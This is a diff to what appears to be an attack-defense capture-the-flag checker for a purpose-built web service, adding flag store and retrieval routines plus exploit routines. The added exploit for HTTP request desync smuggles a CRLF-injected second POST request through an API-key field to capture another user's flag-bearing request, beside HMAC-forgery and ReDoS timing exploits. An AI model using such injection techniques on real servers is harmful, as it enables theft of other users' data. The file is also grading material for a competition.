@@ -59,14 +59,13 @@ async def _putflag_url(task: PutflagCheckerTaskMessage, client: Client, db: Chai
     await register_user(client, username)
 
     assert client.base_url.port is not None
-    port = client.base_url.port - random.randint(1, 7)
+    base_url = client.base_url.copy_with(port=client.base_url.port - random.randint(1, 7))
 
-    url = client.base_url.copy_with(port=port, path=f"/{quote(task.flag, safe='')}")
-    await submit_page(client, False, str(url))
+    await submit_page(client, False, str(base_url.join(f"/{quote(task.flag, safe='')}")))
 
     await db.set("cookie", client.cookies["user_account"])
 
-    return str(port)
+    return base_url.netloc.decode()
 
 
 @_CHECKER.getflag(0)
@@ -131,6 +130,37 @@ async def _getflag_short_url(task: GetflagCheckerTaskMessage, client: Client, db
     assert_in(task.flag, unquote(url), "Flag missing from URL")
 
 
+@_CHECKER.putflag(2)
+async def _putflag_api_key(task: PutflagCheckerTaskMessage, client: Client, db: ChainDB) -> str:
+    username = username_noise(128)
+    await register_user(client, username)
+
+    assert client.base_url.port is not None
+    base_url = client.base_url.copy_with(port=client.base_url.port + 1)
+
+    await verify_netloc(client, base_url.netloc.decode(), task.flag)
+
+    url = str(base_url.join(f"/{letter_noise(128)}"))
+    await submit_page(client, False, str(url))
+
+    await db.set("cookie", client.cookies["user_account"])
+
+    return url
+
+
+@_CHECKER.getflag(2)
+async def _getflag_api_key(task: GetflagCheckerTaskMessage, client: Client, db: ChainDB) -> None:
+    try:
+        cookie = await db.get("cookie")
+    except KeyError as e:
+        raise MumbleException("Missing putflag data in DB") from e
+
+    client.cookies["user_account"] = cookie
+
+    res = await get_search_console(client)
+    assert_in(task.flag, unquote(unescape(res.text)), "API key not in table")
+
+
 @_CHECKER.putnoise(0)
 async def _put_public_document(client: Client, db: ChainDB) -> None:
     username = username_noise(128)
@@ -188,18 +218,18 @@ async def _cron(client: Client) -> None:
 @_CHECKER.havoc(1)
 async def _verify_netloc(client: Client) -> None:
     assert client.base_url.port is not None
-    port = client.base_url.port + 1
+    base_url = client.base_url.copy_with(port=client.base_url.port + 1)
 
     user_a = username_noise(128)
     await register_user(client, user_a)
-    url = str(client.base_url.copy_with(port=port, path=f"/{letter_noise(16)}"))
-    await submit_page(client, False, url)
+    url_a = str(base_url.join(f"/{letter_noise(16)}"))
+    await submit_page(client, False, url_a)
 
     user_b = username_noise(128)
     await register_user(client, user_b)
 
-    netloc = client.base_url.copy_with(port=port).netloc.decode()
-    api_key = letter_noise(128)
+    netloc = base_url.netloc.decode()
+    api_key = f"public{letter_noise(128)}"
     netloc_hash = await verify_netloc(client, netloc, api_key)
 
     while True:
@@ -210,28 +240,27 @@ async def _verify_netloc(client: Client) -> None:
         await asyncio.sleep(0.1)
 
     body = await token(client, netloc_hash, t[1])
-    assert_in(url, unescape(body), "Failed to find entries for verified netloc")
+    assert_in(url_a, unescape(body), "Failed to find entries for verified netloc")
     assert_in(user_a, unescape(body), "Failed to find entries for verified netloc")
+
+    await submit_page(client, False, str(base_url.join(f"/{letter_noise(16)}")))
+
+    logs = await logger(client)
+    assert_in(api_key, unescape(logs), "API-Key not found in logged request")
 
 
 @_CHECKER.exploit(0)
 async def _exploit_hmac(client: Client, task: ExploitCheckerTaskMessage) -> str:
-    if task.attack_info is None:
-        raise MumbleException("Missing attack info")
-    try:
-        port = int(task.attack_info)
-    except ValueError as e:
-        raise MumbleException("Invalid attack info") from e
+    assert task.attack_info is not None
 
-    netloc = client.base_url.copy_with(port=port).netloc.decode()
     username = username_noise(128)
 
-    await register_user(client, f"{username}{netloc}")
+    await register_user(client, f"{username}{task.attack_info}")
     hmac = parse_qs(client.cookies["user_account"])["hmac"][0]
 
     await register_user(client, username)
 
-    netloc_hash = await verify_netloc(client, netloc, "")
+    netloc_hash = await verify_netloc(client, task.attack_info, "")
 
     body = await token(client, netloc_hash, hmac)
 
@@ -244,8 +273,7 @@ async def _exploit_sca(
     client: Client,
     task: ExploitCheckerTaskMessage,
 ) -> str:
-    if task.attack_info is None:
-        raise MumbleException("Missing attack info")
+    assert task.attack_info is not None
 
     cal = await calibrate_redos(logger, client)
 
@@ -255,6 +283,56 @@ async def _exploit_sca(
 
     url = await get_short_url(client, SHORT_URL_PREFIX + short_url)
     return unquote(url.removeprefix(str(_FLAG_BASE_URL)).lstrip("/"))
+
+
+@_CHECKER.exploit(2)
+async def _exploit_desync(client: Client, task: ExploitCheckerTaskMessage) -> str:
+    assert task.attack_info is not None
+
+    url = httpx.URL(task.attack_info)
+    assert url.is_absolute_url
+
+    username = username_noise(128)
+    await register_user(client, username)
+
+    await submit_page(client, False, task.attack_info)
+
+    netloc = url.netloc.decode()
+    cl = (
+        103  # extra headers
+        + 197  # next request w/o flag
+        + 51  # flag
+    )
+    netloc_hash = await verify_netloc(
+        client,
+        netloc,
+        f"\r\n\r\nPOST / HTTP/1.1\r\nhost:{netloc}\r\ncontent-length:{cl}\r\n\r\n",
+    )
+
+    while True:
+        logs = await logger(client)
+        t = re.search(f"user={re.escape(username)}&token=([0-9a-f]{{56}})", unquote(unescape(logs)))
+        if t:
+            break
+        await asyncio.sleep(0.1)
+
+    body = await token(client, netloc_hash, t[1])
+    refresh_hash = re.findall(
+        f"{re.escape(task.attack_info)}</td><td>([^<]*)</td><td>No</td><td><a href=\"javascript:refresh\\('([^']*)",
+        unescape(body),
+    )
+    assert len(refresh_hash) == 2
+
+    # TODO: ensure timing is tight enough
+    await asyncio.gather(
+        client.post("/refresh", data={"hash": next(h for u, h in refresh_hash if u == username)}),
+        client.post("/refresh", data={"hash": next(h for u, h in refresh_hash if u != username)}),
+    )
+
+    logs = await logger(client)
+    # TODO: read hex instead
+    content = re.sub("(?:[0-9a-f]{2} )+ +(.+?)\n", r"\1", unescape(logs))
+    return "\n".join(m[0] for m in re.finditer(task.flag_regex, content))
 
 
 def app() -> fastapi.FastAPI:
